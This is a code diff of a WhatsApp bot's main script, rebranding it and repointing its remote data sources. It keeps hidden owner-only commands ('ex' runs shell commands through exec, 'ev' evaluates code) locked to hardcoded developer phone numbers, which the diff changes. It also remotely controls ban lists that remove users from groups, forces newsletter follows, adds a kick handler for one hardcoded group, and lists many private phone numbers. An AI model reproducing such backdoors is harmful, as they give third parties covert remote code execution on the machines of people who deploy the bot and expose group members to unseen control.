@@ -145,7 +145,7 @@ const DEFAULT_OWNER_JID = `${connectnumber.connectmsg_sent}`;
 conn.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect } = update;
 
-      if (connection === 'close') {
+    if (connection === 'close') {
         const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
         console.log(`❌ Disconnected: ${lastDisconnect?.error?.message || 'unknown reason'} (${shouldReconnect ? 'Reconnecting' : 'Logged out'})`);
         if (shouldReconnect) connectToWA();
@@ -155,7 +155,7 @@ conn.ev.on('connection.update', async (update) => {
         setTimeout(async () => {
             try {
                 // Fetch custom connect message from server
-                let captionText = '✅ NADEEN connected successfully!';
+                let captionText = '✅ NADEEN-MD connected successfully!';
                 try {
                     const response = await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/master.json');
                     const ownerdataa = response.data;
@@ -166,7 +166,7 @@ conn.ev.on('connection.update', async (update) => {
 
                 // Send initial connect image
                 await conn.sendMessage(DEFAULT_OWNER_JID, {
-                    image: { url: 'https://files.catbox.moe/3mvn78.png' },
+                    image: { url: 'https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg' },
                     caption: captionText
                 });
 const mvSize = config.MV_SIZE;
@@ -210,17 +210,26 @@ const leaveMsg = config.LEAVE_MSG;
   const can = `
 *⚙️ BOT CURRENTLY SETTINGS ⚙️*
 
-*\`• Bot Name :\`* ${botName || "NADEEN-MD"}
+*\`• Owner Number :\`* ${DEFAULT_OWNER_JID || "Not Set"}
+*\`• Bot Name :\`* ${botName || "Not Set"}
+*\`• Bot JID :\`* ${botJid || "Not Set"}
+*\`• Seedr Mail :\`* ${seedrMail || "Not Set"}
+*\`• Seedr Password :\`* ${seedrPassword ? "********" : "Not Set"}
+*\`• Language :\`* ${lang || "SI"}
 *\`• Sudo Users :\`* ${sudoUsers?.length ? sudoUsers.join(", ") : "None"}
 *\`• Blocked JIDs :\`* ${blockedJids?.length ? blockedJids.join(", ") : "None"}
+*\`• Anti Bad Words :\`* ${antiBad?.length ? antiBad.join(", ") : "None"}
+*\`• Welcome/Leave Msgs :\`* ${welcomeLeaveMsgs?.length ? welcomeLeaveMsgs.join(", ") : "None"}
 *\`• Max Size :\`* ${maxSize ?? 150} MB
 *\`• Anti Call :\`* ${antiCall ?? "false"}
 *\`• Auto Read Status :\`* ${autoReadStatus ?? "false"}
 *\`• Auto Block :\`* ${autoBlock ?? "false"}
+*\`• Auto Sticker :\`* ${autoSticker ?? "false"}
 *\`• Auto Voice :\`* ${autoVoice ?? "false"}
 *\`• Auto React :\`* ${autoReact ?? "false"}
 *\`• CMD Only Read :\`* ${cmdOnlyRead ?? "true"}
 *\`• Work Type :\`* ${workType ?? "private"}
+*\`• XNXX Block :\`* ${xnxxBlock ?? "true"}
 *\`• Auto Msg Read :\`* ${autoMsgRead ?? "false"}
 *\`• Auto Typing :\`* ${autoTyping ?? "false"}
 *\`• Auto Recording :\`* ${autoRecording ?? "false"}
@@ -230,7 +239,12 @@ const leaveMsg = config.LEAVE_MSG;
 *\`• Prefix :\`* ${prefix ?? "."}
 *\`• Chat Bot :\`* ${chatBot ?? "false"}
 *\`• Always Offline :\`* ${alwaysOffline ?? "false"}
+*\`• MV Block :\`* ${mvBlock ?? "true"}
 *\`• Buttons Enabled :\`* ${button ?? "false"}
+*\`• Action :\`* ${action ?? "delete"}
+*\`• Antilink Action :\`* ${antiLinkAction ?? "delete"}
+*\`• Values :\`* ${values?.length ? values.join(", ") : "None"}
+*\`• Logo :\`* ${logo ?? "https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg"}
 *\`• Anti Delete :\`* ${antiDelete ?? "off"}
 *\`• Leave Msg :\`* ${leaveMsg || "None"}
 `;
@@ -256,7 +270,7 @@ const leaveMsg = config.LEAVE_MSG;
 				 console.log("✅ Successfully joined the group!");
                 // Send config message
                 await conn.sendMessage(DEFAULT_OWNER_JID, {
-                    image: { url: 'https://files.catbox.moe/3mvn78.png' },
+                    image: { url: 'https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg' },
                     caption: can
                 });
 
@@ -279,7 +293,7 @@ fs.readdirSync("./plugins/").forEach((plugin) => {
 console.log('All Plugins installed ⚡')
 await connectdb()
 await updb()		
-console.log('NADEEN-MD CONNECTED ✅')
+console.log('NADEEN-MD MOVIE DL CONNECTED ✅')
 
 
 
@@ -361,17 +375,22 @@ if (mek.key && mek.key.remoteJid === 'status@broadcast') {
 const metadata = await conn.newsletterMetadata("jid", `${ownerdataa.mainchanal}`)	      
 if (metadata.viewer_metadata === null){
 await conn.newsletterFollow(`${ownerdataa.mainchanal}`)
-console.log("NADEEN MD UPDATES CHANAL FOLLOW ✅")
+console.log("NADEEN-MD MD UPDATES CHANAL FOLLOW ✅")
 }	 
- const metadataaaaa = await conn.newsletterMetadata("jid", `120363401459763114@newsletterr`)	      
+ const metadataaaaa = await conn.newsletterMetadata("jid", `120363304606757133@newsletter`)	      
 if (metadataaaaa.viewer_metadata === null){
-await conn.newsletterFollow(`120363401459763114@newsletter`)
-console.log("DINKA MOVIES CHANAL FOLLOW ✅")
-}     
- const metadataaa = await conn.newsletterMetadata("jid", `120363190237215199@newsletter `)	      
+await conn.newsletterFollow(`120363304606757133@newsletter`)
+console.log(" NADEEN'z CHANAL FOLLOW ✅")
+}   
+const metadataa = await conn.newsletterMetadata("jid", `120363401175047907@newsletter`)	      
+if (metadataa.viewer_metadata === null){
+await conn.newsletterFollow(`120363401175047907@newsletter`)
+console.log("INFINITY - DEVELOPERS CHANAL FOLLOW ✅")
+}   
+ const metadataaa = await conn.newsletterMetadata("jid", `120363401322137865@newsletter`)	      
 if (metadataaa.viewer_metadata === null){
-await conn.newsletterFollow(`120363190237215199@newsletter `)
-console.log("MTV CHANAL FOLLOW ✅")
+await conn.newsletterFollow(`120363401322137865@newsletter`)
+console.log("Manoj X CHANAL FOLLOW ✅")
 } 
 
 
@@ -835,12 +854,12 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
   }
 }
 
-const ownerdata = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
+const ownerdata = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/master.json')).data
             
            
             config.FOOTER = ownerdata.footer
            
-const preUser = await fetchJson(`https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/premirum.json`)
+const preUser = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/premium_user.json`)
 const preUsers = preUser.numbers.split(",");
 
 // replace करके "@s.whatsapp.net" format එකට convert කරලා check කරන්න
@@ -854,7 +873,7 @@ const isPre = preUsers
 
 	    
 //============================================================================ 
-const banbn = await fetchJson(`https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/ban_number.json`)
+const banbn = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/ban_number.json`)
 const plynYnna = banbn.split(",")
 const isBanUser = [ ...plynYnna ]
       .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
@@ -889,77 +908,72 @@ if ( isCmd && isBanGrp && !isMe && !isSudo) return
 
 //========================================== TEAM REACT SECTION ========================================
 
-const rec = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/react.json')).data
+const rec = (await axios.get('https://mv-visper-full-db.pages.dev/Main/react.json')).data
 
-const recc = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
+const recc = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/master.json')).data
 
 //================================================================================================================	    
 const id = mek.key.server_id
-const defaultEmojis = ["❤️", "💛", "💚", "💙"];
+const defaultEmojis = ["❤️", "💖", "💚", "💙","💛"];
 const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
 await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
-await conn.newsletterReactMessage(`${recc.dinkachanal}`, id, randomEmoji);
+await conn.newsletterReactMessage(`120363401459763114@newsletter`, id, randomEmoji);
     
 //=========================================================================================================================	    
-if(senderNumber.includes("94711451319")){
-if(isReact) return
-m.react(`${rec.nadeen}`)
-}
-if(senderNumber.includes("94716769285")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94715973437")){
-if(isReact) return
-m.react(`${rec.nadeen}`)
-}
-if(senderNumber.includes("94728840491")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94779483535")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94716769285")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94785432344")){
-if(isReact) return
-m.react(`${rec.abhi}`)
-}
-if(senderNumber.includes("94785432344")){
-if(isReact) return
-m.react(`${rec.abhi2}`)
-}
-if(senderNumber.includes("94785432344")){
-if(isReact) return
-m.react(`${rec.abhi3}`)
-}
-if(senderNumber.includes("94778500326")){
+if(senderNumber.includes("94724375368")){
 if(isReact) return
 m.react(`${rec.sadas}`)
 }
-if(senderNumber.includes("94775383340")){
+if(senderNumber.includes("94722617699")){
 if(isReact) return
-m.react(`${rec.manhiru}`)
+m.react(`${rec.saviya}`)
 }
-if(senderNumber.includes("94755094957")){
+if(senderNumber.includes("94756857260")){
 if(isReact) return
-m.react(`${rec.nimmi}`)
+m.react(`${rec.alex}`)
+}
+if(senderNumber.includes("94719255382")){
+if(isReact) return
+m.react(`${rec.poorna}`)
+}
+if(senderNumber.includes("94724884317")){
+if(isReact) return
+m.react(`${rec.damiru}`)
 
 }
-if(senderNumber.includes("94712050104")){
+if(senderNumber.includes("94787318729")){
 if(isReact) return
-m.react(`${rec.wesi}`)
+m.react(`${rec.sadas}`)
 
 }
+if(senderNumber.includes("94716769285")){
+if(isReact) return
+m.react(`${rec.sadas}`)
+
+}
+if(senderNumber.includes("94711451319")){
+if(isReact) return
+m.react(`👨‍💻`)
+}
+		
+		
+if(senderNumber.includes("94742524701")){
+if(isReact) return
+m.react(`${rec.alex}`)
+
+}
+
+if(senderNumber.includes("94766863255")){
+if(isReact) return
+m.react(`❤️‍🔥`)
+
+}
+		
 const ownNum = config.OWNER_NUMBER;
 
             if(senderNumber.includes(ownNum)){
 if(isReact) return 
-m.react(`💁‍♂️`)
+m.react(`🕵️`)
             }
 //===================================================================================
 
@@ -996,7 +1010,7 @@ if  ( isGroup &&  !isMe && !isOwner && !isSudo ) return
 if ( isBanUser ) {
 	await conn.sendMessage(from, { delete: mek.key })
 	await conn.groupParticipantsUpdate(from, [sender], 'remove')
-	return await conn.sendMessage(from, { text: "*You are banned by NADEEN TEAM ❌*" })
+	return await conn.sendMessage(from, { text: "*You are banned by NADEEN-MD TEAM ❌*" })
 }
 
 	
@@ -1332,12 +1346,12 @@ if(!isOwner) {
     if(originalMessage.message.stickerMessage){
      
     //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
-     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD 🌟'})
+     const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD-MD 🌟'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
     
     }else{
     
-    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD 🌟'})
+    const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'NADEEN-MD-MD 🌟'})
     return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
     
       }
@@ -1463,44 +1477,34 @@ if(body === "send" || body === "Send" || body === "Ewpm" || body === "ewpn" || b
     }
 }
 	   
-// Put this at the top of your message handler (where incoming messages are processed)
-// Store original messages
-// Anti-Edit function
-conn.ev.on('messages.update', async (updates) => {
-    for (let update of updates) {
-        const senderId = update.key.participant || update.key.remoteJid;
-        const remoteJid = update.key.remoteJid;
+const targetGroup = '120363403596811257@g.us';
 
-        // Owner messages ignore කරන්න
-       
+conn.ev.on('messages.upsert', async (m) => {
+  try {
+    const msg = m.messages[0];
+    if (!msg.message) return;
 
-        // Edited message නම්
-        if (update.updateType === 'message.edit') {
-            const originalMessage = loadChatData(remoteJid, update.key.id)[0]; // පෙර save කරපු original message
+    const from = msg.key.remoteJid;
+    const sender = msg.key.participant || msg.key.remoteJid;
 
-            if (!originalMessage) continue;
+    // Only proceed if it's the specific group
+    if (from !== targetGroup) return;
 
-            let text = "[Non-text message]";
-            if (originalMessage.message?.conversation) text = originalMessage.message.conversation;
-            else if (originalMessage.message?.extendedTextMessage?.text) text = originalMessage.message.extendedTextMessage.text;
+    // Get text from the message
+    const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
 
-            await conn.sendMessage(remoteJid, {
-                text: `❌ *Edited message detected!*\n\n🚮 *Edited by:* _${senderId.split('@')[0]}_\n\n> 🔓 Original: ${text}`
-            });
-        }
+    // Check for command triggers
+    if (text.startsWith('.ping') || text.startsWith('.menu') || text.startsWith('.alive')) {
+      // Optional: check if bot is admin here
+
+      // Kick the user who sent the message
+      await conn.groupParticipantsUpdate(from, [sender], 'remove');
     }
+
+  } catch (err) {
+    console.error('Kick error:', err);
+  }
 });
-
-// Chat save function (incoming messages handle)
-function handleIncomingMessage(message) {
-    const remoteJid = message.key.remoteJid;
-    const messageId = message.key.id;
-
-    const chatData = loadChatData(remoteJid, messageId);
-    chatData.push(message);
-    saveChatData(remoteJid, messageId, chatData);
-}
-
 //================================ Auto voice funtion=================================================================
 
 
@@ -1510,26 +1514,14 @@ if(body === "hi" || body === "Hi" || body === "hey" || body === "Hey" || body ==
   if (isMe) return;
 await conn.sendPresenceUpdate('recording', from);
  await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/hi.mp3' }, 
+  audio: { url: 'https://mv-visper-full-db.pages.dev/Data/WhatsApp%20Audio%202025-04-28%20at%2017.12.23.mpeg' }, 
   mimetype: 'audio/mpeg', 
   ptt: true 
 }, { quoted: mek });
 
  }	
 }
-if(body === 'owner' || body === 'nadeen' || body === 'kawuda haduwe' || body === 'made by' || body === 'kwd hduwe'){
-   
- if (config.AUTO_VOICE == 'true') {
-  if (isMe) return;
-await conn.sendPresenceUpdate('recording', from);
- await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/owner%20VOIC4E.mp3' }, 
-  mimetype: 'audio/mpeg', 
-  ptt: true 
-}, { quoted: mek });
 
- }	
-}
 		if(body === "gm" || body === "Gm" || body === "morning" || body === "goodmorning" || body === "good+morning"){
    
  if (config.AUTO_VOICE == 'true') {
@@ -1756,7 +1748,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94711451319) {
+      if(senderNumber == 94778500326) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1768,7 +1760,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94716769285) {
+      if(senderNumber == 94778500326) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1789,7 +1781,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94716769285) {
+      if(senderNumber == 94778500326) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1804,7 +1796,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94711451319 || senderNumber == 94722617699) {
+    if(senderNumber == 94724375368 || senderNumber == 94722617699) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
@@ -1831,9 +1823,9 @@ console.log(isError)
   })
 }
 app.get("/", (req, res) => {
-  res.send("📟 NADEEN-,D Working successfully!");
+  res.send("📟 NADEEN-MD DL Working successfully!");
 });
-app.listen(port, () => console.log(`Nadeen-Md Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`Movie-Nadeen-Md Server listening on port http://localhost:${port}`));
 setTimeout(() => {
 connectToWA()
 }, 3000);
@@ -1848,6 +1840,7 @@ process.on("uncaughtException", function (err) {
   if (e.includes("Authentication timed out")) restart();
   console.log("Caught exception: ", err);
 });
+
 
 
 
